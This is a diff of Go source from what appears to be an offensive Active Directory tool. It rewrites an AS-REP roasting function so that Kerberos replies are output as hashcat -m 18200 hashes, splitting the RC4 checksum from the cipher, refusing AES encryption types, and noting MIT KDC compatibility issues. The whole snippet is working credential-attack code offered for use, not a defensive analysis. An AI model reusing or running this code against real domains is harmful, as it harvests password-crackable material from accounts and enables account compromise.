@@ -286,9 +286,29 @@ func ASRepRoastUser(kdc string, port int, realm, user string, timeout time.Durat
 	if rep.EncPart == nil {
 		return "", fmt.Errorf("no enc-part in AS-REP")
 	}
-	// 生成 hashcat 格式 $krb5asrep$<etype>$user@realm:<hex enc-part>
-	cipherHex := hex.EncodeToString(rep.EncPart.Cipher)
-	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s", rep.EncPart.Etype, user, realm, cipherHex), nil
+	// 生成 hashcat 格式：
+	//   etype 23 (RC4, -m 18200): $krb5asrep$23$user@realm:checksum$cipher
+	//   etype 17/18 (AES, -m 19900): $krb5pa$18$user$realm$checksum$cipher
+	cipherFull := rep.EncPart.Cipher
+	// hashcat 只支持 etype 23 的 AS-REP Roast（-m 18200）：
+	//   $krb5asrep$23$user@domain.com:checksum$cipher
+	// AES-256 (etype 18) 账户的 AS-REP enc-part 无法用 hashcat 破解（无对应模式）
+	if rep.EncPart.Etype != EncTypeRC4Hmac && rep.EncPart.Etype != EncTypeRC4HmacExp {
+		return "", fmt.Errorf("AS-REP Roast: etype %d 无 hashcat 模式（仅 etype 23 支持，-m 18200）", rep.EncPart.Etype)
+	}
+	// RC4 (etype 23): RFC 4757 格式 checksum(16) || rc4(confounder+plaintext)
+	// checksum 在密文开头，hashcat 18200 要求 checksum$cipher 两段
+	checksum := []byte{}
+	body := cipherFull
+	if len(cipherFull) >= 16 {
+		checksum = cipherFull[:16]
+		body = cipherFull[16:]
+	}
+	// MIT KDC 兼容性注记：MIT 无条件发送 EncTGSRepPart tag(26)（RFC 4120 兼容性偏差），
+	// hashcat -m 18200 仅认 EncASRepPart tag(25)（Windows AD 正确值）。
+	// MIT KDC 域的 AS-REP 哈希需用工具转换 tag 或改用支持 26 的破解器。
+	return fmt.Sprintf("$krb5asrep$23$%s@%s:%s$%s",
+		user, realm, hex.EncodeToString(checksum), hex.EncodeToString(body)), nil
 }
 
 // ASRepRoast: 对用户列表批量 AS-REP Roast
